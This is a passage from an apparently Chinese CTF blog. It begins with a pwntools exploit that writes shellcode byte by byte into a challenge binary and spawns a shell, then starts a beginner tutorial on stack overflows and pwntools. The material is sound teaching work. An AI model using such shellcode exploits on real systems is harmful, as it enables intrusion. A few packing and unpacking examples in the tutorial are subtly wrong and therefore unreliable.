class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-h&quot;</span>]</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.os = <span class="string">&quot;linux&quot;</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">payload: <span class="built_in">bytes</span> | <span class="built_in">str</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">return</span> io.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">payload: <span class="built_in">bytes</span> | <span class="built_in">str</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">return</span> io.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">message: <span class="built_in">str</span>, payload: <span class="built_in">bytes</span> | <span class="built_in">str</span></span>) -&gt; <span class="built_in">bytes</span> | <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> io.sendafter(message, payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">message: <span class="built_in">str</span>, payload: <span class="built_in">bytes</span> | <span class="built_in">str</span></span>) -&gt; <span class="built_in">bytes</span> | <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> io.sendlineafter(message, payload)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r</span>(<span class="params">numb = <span class="literal">None</span>, timeout: <span class="built_in">float</span> = <span class="number">5</span></span>) -&gt; <span class="built_in">bytes</span> | <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> io.recv(numb, timeout)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>() -&gt; <span class="built_in">bytes</span> | <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> io.recvline()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ru</span>(<span class="params">message, drop: <span class="built_in">bool</span> = <span class="literal">False</span>, timeout: <span class="built_in">float</span> = <span class="number">5</span></span>) -&gt; <span class="built_in">bytes</span> | <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> io.recvuntil(message, drop=drop, timeout=timeout)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr</span>() -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="keyword">return</span> u64(ru(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_libc</span>(<span class="params">fn_name: <span class="built_in">str</span>, fn_addr: <span class="built_in">int</span></span>) -&gt; LibcSearcher:</span><br><span class="line">    <span class="keyword">return</span> LibcSearcher(fn_name, fn_addr)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inter</span>() -&gt; <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">return</span> io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = <span class="number">0x600bcc</span></span><br><span class="line">ru(<span class="string">b&#x27;addr:&#x27;</span>)</span><br><span class="line">sl(<span class="built_in">hex</span>(flag+<span class="number">3</span>)[<span class="number">2</span>:])</span><br><span class="line">ru(<span class="string">b&#x27;value: &#x27;</span>)</span><br><span class="line">sl(<span class="string">b&#x27;ff&#x27;</span>)</span><br><span class="line"></span><br><span class="line">code = flag + <span class="number">0x14</span> <span class="comment"># 0x600be0</span></span><br><span class="line">sc = asm(shellcraft.sh())</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(sc)):</span><br><span class="line">    ru(<span class="string">b&#x27;addr:&#x27;</span>)</span><br><span class="line">    sl(<span class="built_in">hex</span>(code+i)[<span class="number">2</span>:])</span><br><span class="line">    ru(<span class="string">b&#x27;value: &#x27;</span>)</span><br><span class="line">    sl(<span class="built_in">hex</span>(sc[i])[<span class="number">2</span>:])</span><br><span class="line"></span><br><span class="line">ret_addr = <span class="number">0x600970</span></span><br><span class="line"><span class="comment"># 0x400610 &gt; 0x600be0</span></span><br><span class="line">ru(<span class="string">b&#x27;addr:&#x27;</span>)</span><br><span class="line">sl(<span class="built_in">hex</span>(ret_addr)[<span class="number">2</span>:])</span><br><span class="line">ru(<span class="string">b&#x27;value: &#x27;</span>)</span><br><span class="line">sl(<span class="built_in">hex</span>(<span class="number">0x10</span>^<span class="number">0xe0</span>)[<span class="number">2</span>:])</span><br><span class="line">ru(<span class="string">b&#x27;addr:&#x27;</span>)</span><br><span class="line">sl(<span class="built_in">hex</span>(ret_addr+<span class="number">1</span>)[<span class="number">2</span>:])</span><br><span class="line">ru(<span class="string">b&#x27;value: &#x27;</span>)</span><br><span class="line">sl(<span class="built_in">hex</span>(<span class="number">0x06</span>^<span class="number">0x0b</span>)[<span class="number">2</span>:])</span><br><span class="line">ru(<span class="string">b&#x27;addr:&#x27;</span>)</span><br><span class="line">sl(<span class="built_in">hex</span>(ret_addr+<span class="number">2</span>)[<span class="number">2</span>:])</span><br><span class="line">ru(<span class="string">b&#x27;value: &#x27;</span>)</span><br><span class="line">sl(<span class="built_in">hex</span>(<span class="number">0x40</span>^<span class="number">0x60</span>)[<span class="number">2</span>:])</span><br><span class="line"></span><br><span class="line"><span class="comment"># trigger</span></span><br><span class="line">ru(<span class="string">b&#x27;addr:&#x27;</span>)</span><br><span class="line">sl(<span class="built_in">hex</span>(flag+<span class="number">3</span>)[<span class="number">2</span>:])</span><br><span class="line">ru(<span class="string">b&#x27;value: &#x27;</span>)</span><br><span class="line">sl(<span class="string">b&#x27;ff&#x27;</span>)</span><br><span class="line"></span><br><span class="line">inter()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>pwn新手村</title>
      <link href="/pwn%E6%96%B0%E6%89%8B%E6%9D%91/"/>
      <url>/pwn%E6%96%B0%E6%89%8B%E6%9D%91/</url>
      
        <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p><em><strong>长期更新中……</strong></em></p><p>既然选择这条注定艰难的路，那么话不多说，直接开始吧！<del>（拜托~，pwn掉系统什么的真的超帅的！）</del></p><span id="more"></span><h1 id="也许需要nc一下？！"><a href="#也许需要nc一下？！" class="headerlink" title="也许需要nc一下？！"></a>也许需要nc一下？！</h1><p>要pwn肯定要先连接服务器嘛。一般给了地址和端口可以直接用pwntools的remote连接</p><p>比如给你了 <code>114.514.19.19:810</code></p><p>pwntools远程就是<code>io = remote(&#39;114.514.19.19&#39;, 810)</code>，</p><p>本地打就用 <code>io = process(&#39;file_path&#39;)</code></p><p>如果要在kali上就是 <code>$ nc 114.514.19.19 810</code></p><p>当然有时候可能是ssh，telnet之类的</p><p>可以自行上网搜索如何连接。</p><p>这里以ssh为例： 假设用户是ctf 那么就可以用<code>$ ssh ctf@114.514.19.19 -p 810</code>连接，然后再输入密码（没有给就自己爆吧，甚至可能不给端口2333）</p><p>不过有种偷懒的方法就是直接用xshell连接（download: <a href="https://www.xshell.com/zh/xshell/">XSHELL - NetSarang Website</a>)</p><p>具体用法请自行百度</p><h1 id="这是什么？缓冲区？！溢出一下！"><a href="#这是什么？缓冲区？！溢出一下！" class="headerlink" title="这是什么？缓冲区？！溢出一下！"></a>这是什么？缓冲区？！溢出一下！</h1><p>缓冲区溢出就是长数据复制到小的缓冲区里，多出的数据会发生泄露，导致其他数据被破坏。<strong>常见的栈溢出和堆溢出都包含在内，只是发生在栈上和堆上的区别而已。</strong></p><p>而其中，栈溢出是最常见的漏洞，一般来说难度也比较小（也可以很恶心），作为pwn的起点当之无愧吧。</p><h2 id="栈の基础"><a href="#栈の基础" class="headerlink" title="栈の基础"></a>栈の基础</h2><h3 id="什么是栈？（stack）"><a href="#什么是栈？（stack）" class="headerlink" title="什么是栈？（stack）"></a>什么是栈？（stack）</h3><p>栈是一种<strong>先进后出</strong>的数据结构，这也正好满足了调用函数的方式，即：父函数调用子函数，父在前，子在后；返回值时，子函数先返回，父函数后返回。</p><p>对栈有push（压数据入栈），pop（弹出数据，并储存到指定寄存器或内存中）两种操作。</p><p><img src="/pwn%E6%96%B0%E6%89%8B%E6%9D%91/push_pop.png" alt="push&amp;pop"></p><p><strong>需要注意:</strong> </p><p>1）栈的生长是<strong>从高地址往低地址</strong>，对应上面演示的向下生长</p><p>2）<strong>pop后被弹出的数据还在栈内，但是不能直接访问（还是可以访问的）</strong></p><h3 id="什么是栈帧？（stack-frame）"><a href="#什么是栈帧？（stack-frame）" class="headerlink" title="什么是栈帧？（stack frame）"></a>什么是栈帧？（stack frame）</h3><p>其本质就是一种栈，这种栈专门来<strong>保存函数调用过程中的各种信息（参数，返回地址，本地变量等）。</strong></p><p>栈帧有栈顶和栈底之分，<strong>栈顶地址最低，栈底地址最高，SP（栈指针）是一直指向栈顶的。</strong></p><p>下面是一个栈帧示意图：</p><p><img src="/pwn%E6%96%B0%E6%89%8B%E6%9D%91/%E6%A0%88%E5%B8%A7.png" alt="栈帧"></p><p>一般来说，<code>bp</code>（基址指针）到<code>sp</code>之间的区域当作栈帧。<strong>并不是整个栈空间只有一个栈帧，每调用一个函数，就会生成一个新的栈帧</strong>。</p><p>函数调用过程中，我们将调用函数的函数称为 “调用者（caller）“， 被调用的函数称为 “被调用者（callee）”。其中：</p><p>1）caller需要知道在哪里获取callee的返回值</p><p>2）callee需要知道传入的参数在哪里</p><p>3）返回地址在哪里</p><p>同时，<strong>我们要保证在callee返回后，<code>bp</code>, <code>sp</code>等寄存器的值应该和调用前一致</strong>。所以，我们要用栈来保存这些数据。</p><h2 id="bss，data，text，heap-amp-stack"><a href="#bss，data，text，heap-amp-stack" class="headerlink" title="bss，data，text，heap &amp; stack"></a>bss，data，text，heap &amp; stack</h2><h3 id="bss-segment："><a href="#bss-segment：" class="headerlink" title="bss segment："></a>bss segment：</h3><p>bss段通常用来存放程序中<strong>未初始化的全局变量</strong></p><p>bss是 Block Started by Symbol 的简称</p><p>bss段属于静态内存分配</p><h3 id="data-segment："><a href="#data-segment：" class="headerlink" title="data segment："></a>data segment：</h3><p>数据段通常存放<strong>已经初始化的全局变量</strong>，属于静态内存分配</p><h3 id="code-text-segment："><a href="#code-text-segment：" class="headerlink" title="code(text) segment："></a>code(text) segment：</h3><p>代码段通常用来存放程序执行代码，其大小在编译期确定，并且该内存区域通常为只读（某些架构允许可写，即允许修改程序）</p><h3 id="堆（heap）："><a href="#堆（heap）：" class="headerlink" title="堆（heap）："></a>堆（heap）：</h3><p>堆用于存放程序运行中被动态分配的内存段，大小不固定，可动态扩张或缩减。</p><p>当进程调用malloc等函数分配内存时，新分配的内存会被动态添加到堆上（堆被扩张）；</p><p>使用free等函数释放内存时，被释放的内存从堆中被剔除（堆被缩减）。</p><h3 id="栈（stack）"><a href="#栈（stack）" class="headerlink" title="栈（stack）"></a>栈（stack）</h3><p><strong>栈又称堆栈</strong>，是用户存放程序<strong>临时创建的局部变量</strong>，也就是 {} 中定义的变量（但<strong>不包括static声明的变量</strong>，static意味着在数据段（.data）中存放变量）。</p><p>此外，函数被调用时，其参数也会压入发起调用的进程栈中，并且待到调用结束后，函数的返回值也会被存放回栈中。</p><p>由于栈先进后出的特点，栈特别方便来保存&#x2F;恢复调用现场。</p><p>从这个意义上，<strong>我们可以把堆栈看成一个寄存，交换临时数据的内存区</strong>。</p><h2 id="pwntools基础"><a href="#pwntools基础" class="headerlink" title="pwntools基础"></a>pwntools基础</h2><h3 id="安装pwntools"><a href="#安装pwntools" class="headerlink" title="安装pwntools"></a>安装pwntools</h3><p>使用python自带的pip下载pwntools</p><p><code>$ pip install pwntools</code></p><p>如果在windows上的wsl上直接使用该语句可能会报错</p><p><img src="/pwn%E6%96%B0%E6%89%8B%E6%9D%91/pip-error.png" alt="pip_err"></p><p>不过好在给了你提示，只要在后面加上<code>--break-system-packages</code>即可</p><p>也就是：<code>$ pip install pwntools --break-system-packages</code></p><h3 id="pwntools使用"><a href="#pwntools使用" class="headerlink" title="pwntools使用"></a>pwntools使用</h3><h4 id="基本框架"><a href="#基本框架" class="headerlink" title="基本框架"></a>基本框架</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *<span class="comment"># 导入pwntools模块</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span><span class="comment"># x64架构应为 &#x27;amd64&#x27;</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span><span class="comment"># 设置为目标机的系统，一般是linux</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span><span class="comment"># 输出调试信息</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">或者直接使用:</span></span><br><span class="line"><span class="string">context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span></span><br><span class="line"><span class="string">当然一般情况下arch和os不用设置（要生成shellcode时候要设置），只要设置log_level为debug就可以了</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">io = remote(<span class="string">&#x27;114.514.19.198&#x27;</span>, <span class="number">23333</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">用来建立一个远程连接，url或者ip作为地址，然后指明端口</span></span><br><span class="line"><span class="string">也可以仅使用本地文件，方便调试:</span></span><br><span class="line"><span class="string">io = process(&#x27;./test_pwn_file&#x27;)</span></span><br><span class="line"><span class="string">process用来启动一个本地进程，需要注意.elf不能在windows下运行，应在wsl或者虚拟机里，否则程序会报错，.exe等亦然，所以本地打的话记得脚本在匹配的环境里执行</span></span><br><span class="line"><span class="string">process里是文件路径，其中 &#x27;test_pwn_file&#x27; 是文件名，可以是相对地址，也可以是绝对地址，当然还是建议把exp（攻击利用脚本）和pwn文件（你要打的东西）放到同目录下</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">asm(shellcraft.sh())</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">asm()接收一个字符串，返回汇编码的机器码(bytes)</span></span><br><span class="line"><span class="string">比如:</span></span><br><span class="line"><span class="string"><span class="meta">&gt;&gt;&gt; </span>asm(&#x27;mov eax, 0x10&#x27;)</span></span><br><span class="line"><span class="string">b&#x27;\xb8\x10\x00\x00\x00&#x27;</span></span><br><span class="line"><span class="string">shellcraft模块是shellcode的模块，包含一些生成shellcode的函数</span></span><br><span class="line"><span class="string">这里shellcraft.sh()就是执行/bin/sh的shellcode</span></span><br><span class="line"><span class="string"><span class="meta">&gt;&gt;&gt; </span>asm(shellcraft.sh())</span></span><br><span class="line"><span class="string">b&#x27;jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">io.interactive()</span><br><span class="line"><span class="comment"># 将控制权还给用户，即用户可在终端直接与进程交互</span></span><br><span class="line"><span class="comment"># 在getshell之后使用，一般就放在脚本最后就行了</span></span><br></pre></td></tr></table></figure><h4 id="send-or-receive"><a href="#send-or-receive" class="headerlink" title="send or receive"></a>send or receive</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">io.send(payload)<span class="comment"># 将payload发送到远程连接</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;payload叫攻击载荷，实际上就是你要发送的数据，叫这个名字只是惯例了，你也可以叫其他任何合法的变量名&#x27;&#x27;&#x27;</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line"><span class="comment"># 与send相比是在发送完payload后会多发送一个回车(&#x27;\n&#x27;)</span></span><br><span class="line">io.sendafter(message, payload)</span><br><span class="line">io.sendlineafter(message, payload)</span><br><span class="line"><span class="comment"># 这两个很好理解，就是在接收到message之后再发送payload</span></span><br><span class="line"><span class="comment"># message不需要是接受到的一整个消息，可以是其中的片段</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">io.recv()</span><br><span class="line"><span class="comment"># 接收所有数据，返回接收到的数据</span></span><br><span class="line"><span class="comment"># 可以接收一个int参数，表示接收多少个字节</span></span><br><span class="line"><span class="comment"># recv(6) 就表示接收6个字节</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">比如你收到了一段消息: b&#x27;hello,world!&#x27;</span></span><br><span class="line"><span class="string">recv(6) 就会返回 b&#x27;hello,&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">io.recvuntil(message)</span><br><span class="line"><span class="comment"># 接收到message后停止接收，返回包含message在内的全部数据</span></span><br><span class="line"><span class="comment"># 可以指定一个drop: bool参数，默认为False，若为True则只返回message之前的数据(message被抛弃了)</span></span><br><span class="line"><span class="comment"># 当然如果你继续接收数据的话是不会重新接收一遍message了，只会从message之后继续接收</span></span><br><span class="line">io.recvline()</span><br><span class="line"><span class="comment"># 接收一行数据并返回，等价于 recvuntil(b&#x27;\n&#x27;)</span></span><br></pre></td></tr></table></figure><p><strong>上述发送和接收的方法均能接受<code>str</code>或<code>bytes</code>类型的参数</strong></p><h4 id="数据打包"><a href="#数据打包" class="headerlink" title="数据打包"></a>数据打包</h4><p>pwntools里可以用pack和unpack函数把int打包为bytes，或者把bytes解包为int</p><p>一般直接用封装好的p16&#x2F;p32&#x2F;p64, u16&#x2F;u32&#x2F;u64（好像用vs会警告吧，我自己用显示没在pwntools找到这玩意，反正能跑脚本就行）</p><p>打包 <code>p16/p32/p64</code>: 把一个整数分别打包为16，32或64位</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>p64(<span class="number">0x7ffff3283296</span>)</span><br><span class="line"><span class="string">b&#x27;\x962(\xf3\xff\x7f\x00\x00&#x27;</span></span><br><span class="line"><span class="comment"># 即 b&#x27;\x96\x32\x28\xf3\xff\x7f\x00\x00&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>p16(<span class="number">0x256</span>)</span><br><span class="line"><span class="string">b&#x27;V\x20&#x27;</span></span><br><span class="line"><span class="comment"># 即 b&#x27;\x56\x02&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>p32(<span class="number">0x8004082</span>)</span><br><span class="line"><span class="string">b&#x27;\x82@\x00\x08</span></span><br><span class="line"><span class="string"># 即 b&#x27;</span>\x82\x40\x00\x08<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><p>解包 <code>u16/u32/u64</code>: 解包一个字符串（或bytes），得到整数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">`<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">要注意u16,u32,u64接受的参数分别要是2，4，8个字节，否则会报错</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>addr1 = <span class="string">b&#x27;\x962(\xf3\xff\x7f&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>u64(addr1)<span class="comment"># Error!!!</span></span><br><span class="line">...</span><br><span class="line">struct.error: unpack requires a buffer of <span class="number">8</span> <span class="built_in">bytes</span></span><br><span class="line"><span class="comment"># 一般接受数据不确定有多长就可以用ljust来补到8个字节</span></span><br><span class="line"><span class="comment"># 类似的有zfill，rjust等，可以自行体会其中差异</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">hex</span>(u64(addr1).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="string">&#x27;0x7ffff3283296&#x27;</span></span><br></pre></td></tr></table></figure><p>需要注意：如果待延长的数据是 <code>bytes</code>，<code>ljust</code>第二个参数也必须<code>bytes</code><br>如上例就是必须是 <code>b&#39;\x00&#39;</code>或者<code>b&#39;\0&#39;</code>, 不能是 <code>&#39;\x00&#39;</code>, <code>&#39;\0&#39;</code><br>如果是 <code>str</code> 类型也是一样道理</p><p><del><strong>当然如果你用 python2 就当我没说</strong></del></p><h4 id="输出数据"><a href="#输出数据" class="headerlink" title="输出数据"></a>输出数据</h4><p>输出当然可以用 <code>print</code></p><p>只不过建议用pwntools自带的输出方式，一方面吻合pwntools本来的格式，一方面看着比较舒适</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>out_str = <span class="string">&#x27;hello, world&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>log.info(out_str)</span><br><span class="line">[*] hello, world</span><br><span class="line"><span class="comment"># info代表log等级，也可以用其他的</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>p = log.progress(<span class="string">&#x27;Working&#x27;</span>)</span><br><span class="line">[x] Working</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>p.status(<span class="string">&#x27;Reticulating splines&#x27;</span>)</span><br><span class="line">[x] Working: Reticulating splines</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>p.success(<span class="string">&#x27;Get a shell!&#x27;</span>)</span><br><span class="line">[+] Working: Get a shell!</span><br><span class="line"><span class="comment"># 要注意如果p使用了success之后，就不能再用p输出了，当然不至于报错</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>p.status(<span class="string">&#x27;aaa&#x27;</span>)</span><br><span class="line">no output</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>p.success(<span class="string">&#x27;you did&#x27;</span>)</span><br><span class="line">no output</span><br><span class="line"><span class="comment"># 不过直接用success是可以的</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>success(<span class="string">&#x27;you did&#x27;</span>)</span><br><span class="line">[+] you did</span><br></pre></td></tr></table></figure><h4 id="Cyclic-pattern"><a href="#Cyclic-pattern" class="headerlink" title="Cyclic pattern"></a>Cyclic pattern</h4><p>使用pwntools生成一个pattern（一个str），可以通过其中的一部分数据定位其在一个字符串的位置</p><p>做栈溢出题目时，pattern可以减少计算溢出点的时间</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cyclic(<span class="number">0x100</span>)<span class="comment"># 生成长度0x100的pattern</span></span><br><span class="line">cyclic_find(<span class="number">0x61616161</span>)<span class="comment"># 查找该数据在pattern的位置</span></span><br><span class="line">cyclic_find(<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment"># 可以用字符串查找</span></span><br><span class="line"><span class="comment"># 或者 cyclic -l 0x61616161</span></span><br><span class="line"><span class="comment"># 注: 在pwndbg中使用</span></span><br></pre></td></tr></table></figure><p>比如溢出时构造 <code>cyclic(0x100)</code> ，或者更长，输入后 PC的值变味了 <code>0x61616161</code> 通过 <code>cyclic_find(0x61616161) </code> 就可以得到从哪一个字节开始会控制PC寄存器</p><h4 id="ELF文件操作"><a href="#ELF文件操作" class="headerlink" title="ELF文件操作"></a>ELF文件操作</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>elf = ELF(<span class="string">&#x27;./babyheap&#x27;</span>)</span><br><span class="line">[*] <span class="string">&#x27;/mnt/d/myCTFground/Pwn/Signin/ez_stack&#x27;</span></span><br><span class="line">    Arch:     amd64-<span class="number">64</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (<span class="number">0x400000</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span></span><br></pre></td></tr></table></figure><p>使用ipython或者log_level &#x3D; ‘debug’ 的话就相当于是checksec了，</p><p>我们加载elf文件主要是为了获取一些符号信息</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">hex</span>(elf.address)</span><br><span class="line"><span class="string">&#x27;0x400000&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">hex</span>(elf.symbols[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line"><span class="string">&#x27;0x401040&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">hex</span>(elf.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line"><span class="string">&#x27;0x404008&#x27;</span></span><br><span class="line"><span 